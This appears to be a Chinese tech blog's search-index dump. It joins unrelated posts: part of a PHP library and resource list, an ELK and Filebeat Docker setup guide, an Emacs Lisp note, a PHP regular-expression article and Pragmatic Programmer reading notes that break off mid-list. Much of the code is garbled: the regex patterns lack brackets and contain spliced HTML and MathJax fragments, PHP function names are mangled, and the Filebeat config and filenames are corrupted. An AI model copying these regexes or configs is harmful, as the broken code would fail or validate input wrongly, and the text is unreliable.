官网\nDissect：一个词法和语法分析的工具集合 官网\nPHP Mess Detector：一个扫描代码缺陷,次优代码，未使用的参数等等的库。 官网\nPHP Code Sniffer：一个检测PHP、CSS和JS代码标准冲突的库 官网\nPHPCPD： 一个检测复制和粘贴代码的库 官网\nPHP Analyser：一个分析PHP代码查找缺陷和错误的库 官网\nPHP CS Fixer： 一个编码标准库 官网\nPHP Manipulator：一个分析和修改PHP源代码的库 官网\nPHP Metrics：一个静态测量库 官网\nPHP Refactoring Browser：一个重构PHP代码的命令行工具集 官网\nUBench：一个简单的微型基准检测库 官网\nAthletic：一个基于注释的基准检测库 官网\nMondrian： 使用使用图论的代码分析工具 官网\nScrutinizer：一个审查PHP代码的web工具 官网\nPHPLOC：一个快速测量PHP项目大小的工具 官网\nxHprof：另一个PHP分析工具 官网\nPHPCheckstyle：一个帮助遵守特定的编码惯例的工具。 官网\n\n 调试\n\n调试代码的库和工具\n\nxDebug：一个调试和分析PHP的工具 官网\nPHP Debug Bar： 一个调试工具栏 官网\nPHP Console：一个web调试控制台 官网\nBarbushin PHP Console：另一个使用Google Chrome的web调试控制台 官网\nPHPDBG：一个交互的PHP调试器 官网\nTracy：一个简单的错误检测，写日志和时间测量库 官网\n\n构建工具\n\n项目构建和自动化工具\n\nGo：一个简单的PHP构建工具 官网\nBob：一个简单的项目自动化工具 官网\nPhake：一个PHP克隆库 官网\nBox：一个构建PHAR文件的工具 官网\nPhing：一个灵感来自于Apache Ant的PHP项目构建系统 官网\n\n 任务运行器\n\n自动运行任务的库\n\nTask：一个灵感来源于Grunt和Gulp的纯PHP任务运行器 官网\nRobo：一个面向对象配置的PHP任务运行器 官网\nBldr：一个构建在Symfony组件上的PHP任务运行器 官网\n\n导航\n\n构建导航结构的工具\n\nKnpMenu：一个菜单库 官网\nCartographer：一个站点地图生成库 官网\n\n 资源管理\n\n管理，压缩和最小化web站点资源的工具\n\nAssetic：一个资源管理的管道库 官网\nPipe：另一个资源管理的管道库 官网\nMunee：一个资源优化库 官网\nJShrink：一个JavaScript最小化库 官网\nPuli：一个检测资源绝对路径的库 官网\n\n地理位置\n\n为地理编码地址和使用纬度经度的库。\n\nGeoCoder：一个地理编码库 官网\nGeoTools：一个地理工具相关的库 官网\nPHPGeo：一个简单的地理库 官网\nGeoJSON：一个地理JSON的实现 官网\n\n 日期和时间\n\n处理日期和时间的库\n\nCarbon：一个简单的日期时间API扩展 官网\nExpressiveDate：另一个日期时间API扩展 官网\nCalendR：一个日历管理库 官网\n\n事件\n\n时间驱动或非阻塞事件循环实现的库\n\nReact：一个事件驱动的非阻塞I/O库 官网\nRx.PHP：一个reactive扩展库 官网\nRatchet： 一个web套接字库 官网\nHoa WebSocket：另一个web套接字库 官网\nHoa EventSource：一个事件源库 官网\nEvenement：一个事件分发库 官网\nFuelPHP Event：另一个事件分发库 官网\n\n 日志\n\n生成和处理日志文件的库\n\nMonolog：一个全面的日志工具 官网\nKLogger：一个易用的PSR-3兼容的日志类 官网\n\n电子商务\n\n处理支付和构建在线电子商务商店的库和应用\n\nOmniPay：一个框架混合了多网关支付处理的库 官网\nPayum：一个支付抽象库 官网\nSylius：一个开源的电子商务解决方案 官网\nThelia：另一个开源的电子商务解决方案 官网\nMoney：一个Fowler金钱模式的PHP实现 官网\nSebastian Money：另一个处理货币值的库 官网\nSwap：一个汇率库 官网\n\n PDF\n\n处理PDF文件的库和软件\n\nSnappy：一个PDF和图像生成器库 官网\nWKHTMLToPDF：一个将HTML转换为PDF的工具 官网\n\n数据库\n\n使用对象关系映射（ORM）或数据映射技术的数据库交互库\n\nDoctrine：一个全面的DBAL和ORM 官网\nDoctrine Extensions：一个Doctrine行为扩展的集合 官网\nPropel：一个快速的ORM，迁移库和查询构架器 官网\nEloquent：Laravel 4 ORM 官网\nBaum：一个Eloquent的嵌套集实现 官网\nSpot2：一个MySQL的ORM映射器 官网\nRedBean：一个轻量级，低配置的ORM 官网\nPomm：一个PostgreSQL对象模型管理器 官网\nProxyManager：一个为数据映射生成代理对象的工具集 官网\n\n 迁移\n\n帮助管理数据库模式和迁移的库\n\nPHPMig：另一个迁移管理库 官网\nPhinx：另一个数据库迁移管理库 官网\nMigrations：一个迁移管理库 官网\nDoctrine Migrations：一个Doctrine迁移库 官网\n\nNoSQL\n\n处理NoSQL后端的库\n\nMongoQB：一个MongoDB查询构建库 官网\nMonga：一个MongoDB抽象库 官网\nPredis： 一个功能完整的Redis库 官网\n\n 队列\n\n处理事件和任务队列的库\n\nPheanstalk：一个Beanstalkd 客户端库 官网\nHP AMQP：一个纯PHP AMQP库 P官网\nThumper： 一个RabbitMQ模式库 官网\nBernard：一个多后端抽象库 官网\n\n搜索\n\n在数据上索引和执行查询的库和软件\n\nElasticSearch PHP：ElasticSearch的官方客户端库 官网\nElastica：ElasticSearch的客户端库 官网\nSolarium：Solr的客户端库 官网\nSphinxQL query builder：Sphinx搜索引擎的的查询库 官网\n\n 命令行\n\n构建命令行工具的库\n\nBoris：一个微型PHP REPL 官网\nPsySH：另一个微型PHP REPL 官网\nPecan：一个事件驱动和非阻塞内核 官网\nGetOpt：一个命令行选择解析器 官网\nOptParse：另一个命令行选择解析器 官网\nCommando：另一个简单的命令行选择解析器 官网\nGetOptionKit：另一个命令行选择解析器 官网\nCron Expression：计算cron运行日期的库 官网\nShellWrap：一个简单的命令行包装库 官网\nHoa Console：另一个命令行库 官网\nShunt：一个在多台远程机器上并行运行命令行的库 官网\nCilex：一个构建命令行工具的微型框架 官网\n\n身份验证\n\n实现身份验证的库\n\nSentry：一个混合的身份验证和授权的框架库 官网\nSentry Social：一个社交网络身份验证库 官网\nOpauth：一个多渠道的身份验证框架 官网\nOAuth2：一个OAuth2身份验证服务，资源服务器和客户端库 官网\nOAuth2 Server：另一个OAuth2服务器实现 官网\nPHP oAuthLib：另一个OAuth库 官网\nTwitterOAuth：一个Twitter OAuth库 官网\nTwitterSDK：一个完全测试的Twitter SDK 官网\nHawk：一个Hawk HTTP身份认证库 官网\nHybridAuth：一个开源的社交登陆库 官网\n\n 标记\n\n处理标记的库\n\nDecoda：一个轻量级标记解析库 官网\nPHP Markdown：一个Markdown解析器 官网\nCommonMark PHP：一个对 CommonMark spec全支持的Markdown解析器 官网\nDflydev Markdown：另一个Markdown解析器 官网\nParsedown：另一个Markdown解析器 官网\nCiconia：另一个支持Github Markdown风格的Markdown解析器 官网\nCebe Markdown：一个快速的可扩展的Markdown解析器 官网\nHTML5 PHP：一个HTML5解析和序列化库 官网\n\n字符串\n\n解析和处理字符串的库\n\nANSI to HTML5：ANSI到HTML5的转化库 官网\nPatchwork UTF-8：一个处理UTF-8字符串的便携库 官网\nHoa String：另一个UTF-8字符串库 官网\nStringy：一个多字节支持的字符串处理库 官网\nColor Jizz：处理和转换颜色的库 官网\nUUID： 生成UUIDs的库 官网\nSlugify：转换字符串到slug的库 官网\nUrlify： 一个Django的 URLify.jsPHP通道 官网\nText： 一个文本处理库 官网\nSQL Formatter：一个格式化SQL语句的库 官网\nUA Parser： 一个解析用户代理字符串的库 官网\n\n 数字\n\n处理数字的库\n\nNumbers PHP：处理数字的库 官网\nMath：处理大数字的库 官网\nByteUnits：在二进制和度量系统中解析,格式化和转换字节单元的库 官网\nPHP Units of Measure：一个计量单位转换的库 官网\nPHP Conversion：另一个计量单位转换的库 官网\nLibPhoneNumber for PHP：Google电话号码处理的PHP实现库 官网\n\n过滤和验证\n\n过滤和验证数据的库\n\nFilterus：一个简单的PHP过滤库 官网\nRespect Validate：一个简单的验证库 官网\nValitron：另一个验证库 官网\nUpload：一个处理文件上传和验证的库 官网\nDMS Filter：一个注释过滤库 官网\nMetaYaml：一个支持YAML,JSON和XML的模式验证库 官网\nISO-codes：验证各种ISO和ZIP编码的库(IBAN, SWIFT/BIC, BBAN, VAT, SSN, UKNIN) 官网\n\n  REST API\n\n开发REST-ful API的库和Web工具\n\nApigility：一个使用Zend Framework 2构建的API构建器 官网\nHateoas：一个HOATEOAS REST web服务库 官网\nHAL：一个超文本应用语言（HAL)构建库 官网\nNegotiation：一个内容协商库 官网\nDrest：一个将Doctrine实体暴露为REST资源节点的库 官网\nRestler：一个将PHP方法暴露为RESTful web API的轻量级框架 官网\n\n缓存\n\n缓存数据的库\n\nAlternative PHP Cache (APC)：打开PHP伪代码缓存 官网\nCache：一个缓存库（Doctrine部分） 官网\nStash：另一个缓存库 官网\n\n 数据结构和存储\n\n实现数据结构和存储技术的库\n\nArdent：一个数据结构库 官网\nPHP Collections： 一个简单的集合库 官网\nSerializer：一个序列化和反序列化数据的库 官网\nPHP Object Storage：一个对象存储库 官网\nFractal：一个转换复杂数据结构到JSON输出的库 官网\nTotem：一个管理和穿件数据交换集的库 官网\nPINQ：一个PHP实时Linq库 官网\nJsonMapper：一个将内嵌JSON结构映射为PHP类的库 官网\n\n通知\n\n处理通知软件的库\n\nNod：一个通知库（Growl等） 官网\nNotificato：一个处理推送通知的库 官网\nNotification Pusher：一个设备推送通知的独立库 官网\nNotificator：一个轻量级的通知库 官网\n\n 部署\n\n项目部署库\n\nPomander：一个PHP应用部署工具 官网\nRocketeer：PHP世界里的一个快速简单的部署器 官网\nEnvoy：一个用PHP运行SSH任务的工具 官网\nPlum：一个部署库 官网\n\n国际化和本地化\n\n国际化（I18n）和本地化（L10n）\n\nAura.Intl：官网\n\n 第三方API\n\n访问第三方API的库\n\nAmazon Web Service SDK：PHP AWS SDK官方库 官网\nS3 Stream Wrapper：Amazon S3流包装库 官网\nStripe：Stripe官方PHP库 官网\nCampaign Monitor：Campaign Monitor官方PHP库 官网\nDigital Ocean：Digital Ocean API 接口库 官网\nGithub：Github API交互库 官网\nPHP Github API：另一个Github API交互库 官网\nTwitter OAuth：Twitter OAuth工作流交互库 官网\nTwitter REST：Twitter REST API交互库 官网\nDropbox SDK：Dropbox SDK官方PHP库 官网\nTwilio：Twilio官方PHP REST API 官网\nMailgun：Mailgun官方PHP REST API 官网\n\n扩展\n\n帮组构建PHP扩展的库\n\nZephir：用于开发PHP扩展，且介于PHP和C++之间的编译语言 官网\nPHP CPP：一个开发PHP扩展的C++库 官网\n\n 杂项\n\n不在上面分类中的有用库和工具\n\nSpork：一个处理forking的库 官网\nJSON Lint：一个JSON lint工具 官网\nJSONPCallbackValidator：验证JSONP回调的库 官网\nPagerfanta：一个分页库 官网\nRuler：一个简单的无状态的生产环境规则引擎。 官网\nLiteCQRS：一个CQRS(命令查询责任分离)库 官网\nSslurp：一个使得SSL处理减少的库 官网\nOptionPHP 官网一个可选的类型库\nMetrics：一个简单的度量API库 官网\nSabre VObject：一个解析VCard和iCalendar对象的库 官网\nAnnotations：一个注释库（Doctrine部分） 官网\nWhoops：一个不错的错误处理库 官网\nFinite：一个简单的PHP有限状态机 官网\nLadyBug：一个dumper库 官网\nProcrastinator：运行耗时任务的库 官网\nCompose：一个功能组合库 官网\nSuperClosure：一个允许闭包序列化的库 官网\nJumper：一个远程服务执行库 官网\nUnderscore：一个Undersccore JS库的PHP实现 官网\nPHP PassBook：一个iOS PassBook PHP库 官网\nPHP Expression：一个PHP表达式语言 官网\nRMT：一个编写版本和发布软件的库 官网\nWise：一个配置管理器 官网\nOpengraph：一个开放图库 官网\nEssence：一个提取web媒体的库 官网\nEmbera：一个Oembed消费库 官网\nGraphviz：一个图形库 官网\nMonad PHP：官网 一个简单Monad库\nFlux：一个正则表达式构建库 官网\nPatchwork：一个重新定义用户的函数库 官网\nGalapagos：语言转换进化 官网\nDesign Patterns PHP：一个使用PHP实现的设计模式存储库 官网\nPHPCR：一个Java内容存储库（JCR)的PHP实现 官网\nFunctional PHP：一个函数式编程库 官网\nClassPreloader：一个优化自动加载的库 官网\nLib Country：一个国家和地区数据的库 官网\nLib Accessor：一个简化访问的库 官网\nPHPStack：一个PHP编写的TCP/IP栈概念 官网\nNmap：一个Nmap PHP包装器 官网\nCode Mover：一个移动代码的库 官网\nIter：一个使用生成器提供迭代原语的库 官网\nLambda PHP：一个PHP中的Lambda 计算解析器 官网\nCountry List：所有带有名称和ISO 3166-1编码的国家列表 官网\nPHP-GPIO：用于Raspberry PI的GPIO pin的库 官网\nprinto：一个对象图的可视化器 官网\nAlias：一个类别名库 官网\n\n软件\n\n创建一个开发环境的软件\n\n PHP安装\n\n在你的电脑上帮助安装和管理PHP的工具\n\nHomeBrew：一个OSX包管理器 官网\nHomeBrew PHP：一个HomeBrew的PHP通道 官网\nPHP OSX：一个OSX下的PHP安装器 官网\nPHP Brew：一个PHP版本管理和安装器 官网\nPHP Env：另一个PHP版本管理器 官网\nPHP Switch：另一个PHP版本管理器 官网\nPHP Build：另一个PHP版本安装器 官网\nVirtPHP：一个创建和管理独立PHP环境的工具 官网\n\n开发环境\n\n创建沙盒开发环境的软件和工具\n\nVagrant：一个便携的开发环境工具 官网\nAnsible：一个非常简单的编制框架 官网\nPuppet：一个服务器自动化框架和应用 官网\nPuPHPet：一个构建PHP开发虚拟机的web工具 官网\nProtobox：另一个构建PHP开发虚拟机的web工具 官网\nPhansible：一个用Ansible构建PHP开发虚拟机的web工具 官网\n\n 虚拟机\n\n相关的PHP虚拟机\n\nHipHop PHP：Facebook出品的PHP虚拟机，运行时和JIT 官网\nHippyVM：另一个PHP虚拟机 官网\nHack：一个PHP进行无缝操作的 HHVM编程语言 官网\n\nIDE\n\n支持PHP的集成开发环境\n\nNetbeans：一个支持PHP和HTML5的IDE 官网\nEclipse for PHP Developers：一个基于Eclipse平台的PHP IDE 官网\nPhpStorm：一个商业PHP IDE 官网\n\n Web应用\n\n基于Web的应用和工具\n\n3V4L官网一个在线的PHP shell\nDBV：一个数据库版本控制应用 官网\nPHP Queue：一个管理后端队列的应用 官网\nComposer as a Service：作为一个zip文件下载Composer包的工具 官网\nMailCatcher：一个抓取和查看邮件的web工具 官网\n\n资源\n\n各种提高你的PHP开发技能和知识的资源，比如书籍，网站，文章\n\n PHP网站\n\nPHP相关的有用网站\n\nPHP The Right Way：一个PHP最佳实践的快速指引手册 官网\nPHP Best Practices：一个PHP最佳实践指南 官网\nPHP Weekly：一个PHP新闻周刊 官网\nPHP Security：一个PHP安全指南 官网\nPHP FIG：PHP框架交互组 官网\nPHP UG：一个帮助用户定位最近的PHP用户组（UG)的网站 官网\nSeven PHP：一个PHP社区成员采访的网站 官网\nNomad PHP：一个在线PHP学习资源 官网\nPHP Mentoring：点对点PHP导师组织 官网\n\n其他网站\n\nWeb开发相关的有用网站\n\nThe Open Web Application Security Project (OWASP)：一个开放软件安全社区 官网\nWebSec IO：一个Web安全社区资源 官网\nWeb Advent：一个Web开发人员日历 官网\nSemantic Versioning：一个解析语义版本的网站 官网\nAtlassian Git Tutorials：一个Git教程系列 官网\nHg Init：一个Mercurial教程系列 官网\nServers for Hackers：一个关于服务器管理的新闻通讯 官网\n\n PHP书籍\n\nPHP相关的非常好的书籍\n\nScaling PHP Applications：一本Steve Corona关于扩展PHP应用程序的电子书 官网\nThe Grumpy Programmer's Guide to Building Testable PHP Applications：一本Chris Hartjes关于构建PHP应用程序测试的书 官网\nGrumpy PHPUnit：一本Chris Hartjes关于使用PHPUnit进行单元测试的书 官网\nMastering Object-Orientated PHP：一本Brandon Savage关于PHP面向对象的书 官网\nSignaling PHP：一本Cal Evans关于在CLI脚本捕获PCNTL 信号的书 官网\nSecuring PHP: Core Concepts：一本Chris Cornutt关于PHP常见安全条款和实践的书 官网\nModernising Legacy Applications in PHP：一本Paul M.Jones关于遗留PHP应用进行现代化的书 官网\n\n其他书籍\n\n与一般计算和Web开发相关的书\n\nThe Linux Command Line：William Shotts关于Linux命令行的一本书 官网\nUnderstanding Computation：Tom Stuart关于计算理论的一本书 官网\nThe Tangled Web — Securing Web Applications： Michal Zalewski关于web应用安全的一本书 官网\nElasticsearch: The Definitive Guide：Clinton Cormley和Zachary Tong编写的与Elasticsearch工作的一本指南 官网\nEloquent JavaScript：Marijin Haverbeke关于JavaScript编程的一本书 官网\nVagrant Cookbook：Erika Heidi关于创建 Vagrant环境的一本书 官网\nPro Git：Scott Chacon和Ben Straub关于Git的一本书 官网\n\n PHP视频\n\nPHP相关的非常不错的视频\n\nTaking PHP Seriously：来自Facebook Keith Adams 讲述PHP优势 官网\nPHP Town Hall：一个随意的Ben Edmunds和Phil Sturgeon的PHP播客 官网\nProgramming with Anthony：官网  Anthony Ferrara的视频系列\n\nPHP阅读\n\nPHP相关的阅读资料\n\nCreate Your Own PHP Framework：一部Fabien Potencier的关于如何创建你自己的PHP框架的系列文章 官网\nSeven Ways to Screw Up BCrypt：一篇关于纠正BCrypt实现的文章 官网\nPreventing CSRF Attacks：一篇组织CSRF攻击的文章 官网\nDon't Worry About BREACH：一篇关于BREACH攻击和CSRF令牌的文章 官网\nOn PHP 5.3, Lamda Functions and Closures：一篇关于lambda函数和闭包的文章 官网\nUse Env：一篇关于使用unix环境帮助的文章 官网\nComposer Primer：Composer初级 官网\nComposer Versioning：一篇关于Composer版本的文章 官网\nComposer Stability Flags：一篇关于Composer稳定性标志的文章 官网\nInnocent Villagefolk or a Pillagin’ Pirate?：一篇关于PHP从其他语言获取想法的文章 官网\nPredicting Random Numbers in PHP：一篇关于生成随机数的文章 官网\nA 20 Point List for Preventing XSS in PHP：一篇关于组织XSS的文章 官网\nPHP Sucks! But I Like It!：一篇关于PHP利弊的文章 官网\nPHP Is Much Better Than You Think：一篇关于PHP语言和生态圈的文章 官网\n\n PHP内核阅读\n\n阅读PHP内核或性能相关的资料\n\nPHP RFCs：PHP RFCs主页（请求注解） 官网\nPHP Internals Book：一本由三名核心开发编写的关于PHP内核的在线书 官网\nPrint vs Echo, Which One is Faster?：一篇关于打印和echo性能的文章 官网\nThe PHP Ternary Operator. Fast or Not?：一篇关于三元操作性能的文章 官网\nDisproving the Single Quotes Myth：一篇关于单引号，双引号字符串性能的文章 官网\nYou're Being Lied To：一篇关于内核ZVALs的文章 官网\nHow Long is a Piece of String：一篇关于字符串原理的文章 官网\nUnderstanding OpCodes：一篇关于伪代码的文章 官网\nHow Foreach Works：StackOverflow 关于foreach回答的详情 官网\nWhen Does Foreach Copy?：一篇关于foreach原理的文章 官网\nHow Big Are PHP Arrays (And Values) Really?：一篇关于数组原理的文章 官网\nWhy Objects (Usually) Use Less Memory Than Arrays：一篇关于对象和数组原理的文章 官网\nPHP Evaluation Order：一篇关于PHP评估顺序的文章 官网\n开发人员的PHP源代码： 1 2 3 4：关于PHP源代码的系列\n垃圾收集： 1 2 3 关于PHP垃圾收集原理的系列\n\nh3 id=\"weibo-weixin\"微信公众号/h3\nPHP开发者：专注分享 PHP 开发相关的技术文章和工具资源\nbrimg src=\"http://ww1.sinaimg.cn/small/63918611gw1epb2cb1xq0j2046046dgv.jpg\" width=150 height=150","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 Elastic filebeat搭建","title":"基于ELK+Filebeat搭建日志中心","text":"基于ELK+Filebeat搭建日志中心\n  摘要：本文属于原创，欢迎转载，转载请保留出处：https://github.com/jasonGeng88/blog\n\n  本文是基于docker进行的容器化搭建ELK\n\n 当前环境\n系统：centos7\ndocker 1.12.1\n\n介绍\n\n ElasticSearch\n\nElasticsearch 是一个实时的分布式搜索和分析引擎，它可以用于全文搜索，结构化搜索以及分析。它是一个建立在全文搜索引擎 Apache Lucene 基础上的搜索引擎，使用 Java 语言编写。\n\nLogstash\nLogstash 是一个具有实时渠道能力的数据收集引擎，主要用于日志的收集与解析，并将其存入\nElasticSearch中。\n\n Kibana\nKibana 是一款基于 Apache 开源协议，使用 JavaScript 语言编写，为 Elasticsearch 提供分析和可视化的 Web 平台。它可以在 Elasticsearch 的索引中查找，交互数据，并生成各种维度的表图。\n\nFilebeat\n引入Filebeat作为日志搜集器，主要是为了解决Logstash开销大的问题。相比Logstash，Filebeat 所占系统的 CPU 和内存几乎可以忽略不计。\n\n 架构\n不引入Filebeat\n\n 引入Filebeat\n\n部署\n\n 启动ElasticSearch\ndocker run -d -p 9200:9200 --name elasticsearch elasticsearch\n\n启动Logstash\n\n 1. 新建配置文件logstash.conf\ninput {\n    beats {\n        port =  5044\n    }\n}\n\noutput {\n    stdout {\n        codec =  rubydebug\n    }\n    elasticsearch {\n        #填写实际情况elasticsearch的访问IP，因为是跨容器间的访问，使用内网、公网IP，不要填写127.0.0.1|localhost\n        hosts =  [\"{$ELASTICIP}:9200\"]\n\n    }\n}\n\n2.启动容器，暴露并映射端口，挂载配置文件\ndocker run -d --expose 5044 -p 5044:5044 --name logstash -v \"$PWD\":/config-dir logstash -f /config-dir/logstash.conf\n\n 启动Filebeat\n下载地址：https://www.elastic.co/downloads/beats/filebeat\n\n1.下载Filebeat压缩包\nwget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-5.2.2-linux-x8664.tar.gz\n\n 2.解压文件\ntar -xvf filebeat-5.2.2-linux-x8664.tar.gz\n\n3.新建配置文件filebeat.yml\nfilebeat:\n  prospectors:\n    paths:\n        /tmp/test.log 日志文件地址\n      inputtype: log #从文件中读取\n      tailfiles: true #以文件末尾开始读取数据\noutput:\n  logstash:\n      hosts: [\"{$LOGSTASHIP}:5044\"] #填写logstash的访问IP\n\n4.运行filebeat  \n./filebeat-5.2.2-linux-x8664/filebeat -e -c filebeat.yml\n\n 启动Kibana\ndocker run -d --name kibana -e ELASTICSEARCHURL=http://{$ELASTICIP}:9200 -p 5601:5601 kibana\n\n测试\n模拟日志数据\n\n 1.创建日志文件\ntouch /tmp/test.log\n\n2.向日志文件中写入一条nginx访问日志\necho '127.0.0.1 - - [13/Mar/2017:22:57:14 +0800] \"GET / HTTP/1.1\" 200 3700 \"-\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\" \"-\"'     /tmp/test.log\n\n访问 http://{$KIBANAIP}:5601\n\n 总结\n本文主要讲述了如何一步步搭建ELK的过程，以及Filebeat在其中所起的作用。br\n这儿仅仅给大家做了一个演示，要在生产环境中部署时，还需使用数据卷进行数据持久化，容器内存问题也需考虑，elasticsearch与logstash都是相对吃内存的，如果不加以限制，很可能会拖垮你整个服务器。br当然安全因素也是大家不能忽视的，如传输的安全性、端口权限的最小化暴露程度，防火墙设置等。\n\n后续\nlogstash解析日志格式，如JAVA、nginx、nodejs等日志；\nelasticsearch的常用搜索语法；\n通过kibana制作可视化图表；","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 Emacs Elisp","title":"文本编辑 Emacs Elisp","text":"interactive 可以控制要接受的参数的位置\r\n\r\n(defun send-message-to-function (a)\r\n  (interactive \"p\")\r\n  (message (format \"%s\" a)))\r\n这么写的话就可以通过C-u 12 函数的快捷键将数字12传递给函数了。如果是用helm调用的话要输入 M-x 函数名 C-u 数字 RET来调用\r\n\r\n详细介绍的话这里有中文版： https://github.com/emacs-china/hello-emacs/blob/master/elisp.org#L5453\r\n\r\n摘录如下：\r\n\r\n    若一个函数带了交互模式声明,则它也就是一个命令了,即可以通过M-x(execute-command)来调用了.\r\n\r\n    交互模式声明的格式为(interactive code-string),其中:\r\n       若interactive的参数以*开头，则意义是，如果当前buffer是只读的，则不执行该函数\r\n\r\n       interactive可以后接字符串,表示获得参数的方式\r\n      p 接收C-u的数字参数\r\n\r\n           也可以不用P参数,直接在代码中判断current-prefix-arg的值\r\n      r region的开始/结束位置\r\n      n 提示用户输入数字参数,n后面可用接着提示符\r\n      s 提示用户输入字符串参数\r\n      若函数接收多个input,需要用\\n来分隔","tags":null},{"location":"//blog.pytool.com/basic/2015-01-01 10个实用的PHP正则表达式","title":"10个实用的PHP正则表达式","text":"正则表达式是程序开发中一个重要的元素，它提供用来描述或匹配文本的字符串，如特定的字符、词或算式等。但在某些情况下，用正则表达式去验证一个字符串比较复杂和费时。本文为你介绍10种常见的实用PHP正则表达式的写法，希望对你的工作有所帮助。\n验证E-mail地址\n\n这是一个用于验证电子邮件的正则表达式。但它并不是高效、完美的解决方案。在此不推荐使用。\n\n$email = \"test@ansoncheung.tk\";\nif(pregmatch('/^a-zA-Z0-9]+([.+)@+(.+).{2,4}$/',$email)){\n    echo \"Your email is ok.\";\n}else{\n    echo \"Wrong email address format\";\n}\n\n为了更加有效验证电子邮件地址，推荐使用filervar。\n\nif(filtervar('test+email@ansoncheung', FILTERVALIDATEEMAIL)){\n    echo \"Your email is ok.\";\n}else{\n    echo \"Wrong email address format.\";\n}\n\n验证用户名\n\n这是一个用于验证用户名的实例，其中包括字母、数字（A-Z，a-z，0-9）、下划线以及最低5个字符，最大20个字符。同时，也可以根据需要，对最小值和最大值做合理的修改。\n\n$username = \"username12\";\nif(pregmatch('/^[a-z\\d]{5,20}$/i', $username)){\n    echo \"Your username is ok.\";\n}else{\n    echo \"Wrong username format.\";\n}\n\n验证电话号码\n\n这是一个验证美国电话号码的实例。\n\n$phone = \"(021)423-2323\";\nif(pregmatch('/span class=\"MathJaxPreview\"\\(?\\d{3}\\)/spanscript type=\"math/tex\"?\\d{3}/script?[-\\s.]?\\d{3}[-\\s.]\\d{4}/x', $phone)){\n    echo \"Your phone number is ok.\";\n}else{\n    echo \"Wrong phone number.\";\n}\n\n验证IP地址\n\n这是一个用来验证IPv4地址的实例。\n\n$IP = \"198.168.1.78\";\nif(pregmatch('/^((1-9]?[0-9]|1[0-9]{2}|2[0-4|250-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4|25[0-5])$/',$IP)) {\n    echo \"Your IP address is ok.\";\n}else{\n    echo \"Wrong IP address.\";\n}\n\n验证邮政编码\n\n这是一个用来验证邮政编码的实例。\n\n$zipcode = \"12345-5434\";\nif(pregmatch(\"/^([0-9]{5})(-[0-9]{4})?$/i\",$zipcode)){\n   echo \"Your Zip code is ok.\";\n}else{\n   echo \"Wrong Zip code.\";\n}\n\n验证SSN（社会保险号）\n\n这是一个验证美国SSN的实例。\n\n$ssn = \"333-23-2329\";\nif(pregmatch('/^[\\d]{3}-[\\d]{2}-[\\d]{4}$/',$ssn)){\n    echo \"Your SSN is ok.\";\n}else{\n    echo \"Wrong SSN.\";\n}\n\n验证信用卡号\n\n$cc = \"378282246310005\";\nif(pregmatch('/^(?:40-9]{12}(?:[0-9]{3})?|5[1-5{14}|60110-9]{12}|3(?:0[0-5]|[68)0-9]{11}|3[47{13})$/', $cc)){\n    echo \"Your credit card number is ok.\";\n}else{\n    echo \"Wrong credit card number.\";\n}\n\n验证域名\n\n$url = \"http://ansoncheung.tk/\";\nif (pregmatch('/^(http|https|ftp):\\/\\/(A-Z0-9(?:\\.A-Z0-9)+):?(\\d+)?\\/?/i', $url)) {\n    echo \"Your url is ok.\";\n}else{\n    echo \"Wrong url.\";\n}\n\n从特定URL中提取域名\n\n$url = \"http://ansoncheung.tk/articles\";\npregmatch('@^(?:http://)?(+)@i', $url, $matches);\n$host = $matches[1];\necho $host;\n\n10. 将文中关键词高亮显示\n\n$text = \"Sample sentence from AnsonCheung.tk, regular expression has become popular in web programming. Now we learn regex. According to wikipedia, Regular expressions (abbreviated as regex or regexp, with plural forms regexes, regexps, or regexen) are written in a formal language that can be interpreted by a regular expression processor\";\n$text = preg_replace(\"/\\b(regex)\\b/i\", 'span style=\"background:#5fc9f6\"\\1/span', $text);\necho $text;","tags":null},{"location":"//blog.pytool.com/Life/2016-03-23 一个注重实效的程序员","title":"一个注重实效的程序员","text":"这本书是一个编程很厉害的师弟从图书馆借来的，原名叫《一个注重实效的程序员》。我每天到实验室比较早，就翻开这本书看几页。十几天下来，把这本书算是粗粗看完了。其间每有心得，便记录下来。但由于功底有限，对这本书中的一些地方还不甚理解。等以后功力提高后，再细读一遍吧。\n\n1 要经常性地修炼自己拥有的技能。书上的故事：一个公园有世界上最美丽的草坪。有人问那里的园丁，保养草坪有什么秘诀吗？园丁说：有，每天早晨拂去露水，每三修剪一次，每周碾压一次，这样坚持500年就可以了。\n2 讲别人感兴趣的东西，讲了就要让别人听懂。\n3 对一个事物要多动脑筋，结合自身的职业，从多个角度去思考。\n4 程序员被教导说，要多写注释。但他们不知道为什么要写注释。糟糕的程序才需要很多注释。\n5 编程很像作画，先勾勒轮廓，再绘制背景，最后一点一点地描绘细节。\n6 语言的界限就是一个人的世界的界限。\n7 编程时注意使用“合约”，即在函数的注释中，注明函数执行前需要满足什么条件，函数执行后需要满足什么条件，以及返回什么值。\n8 IDE中的建立应用的向导不值得提倡，你点几个按钮，它就为你生成大量的代码，而且与你的代码交织在一起。如果你对生成的代码不甚了解，你就对应用失去了控制，当程序出现问题，你都不知道如何修改。所以，如果你使用编程向导，先看一下它生成的代码，你是否理解，你能否自己手写。\n9 学会将用户需求一般化。比如：用户要求只有人事部门才可以查看用户的档案。不能把这个理解为需求，因为这个里面掺杂着政治因素，可能过不了多久，政策变了，不只人事部门，员工的上级也能察看员工档案，如果你把之前用户的陈述，当作需求，那么，当政策改变后，你将不得不改变程序。正确的做法是，把用户的陈述一般化为：只有指定人员能察看用户的档案。然后把指定人员作为元数据，做到政策与程序分离，当政策变化时，你就只需要改变元数据，而不要改程序。\n10 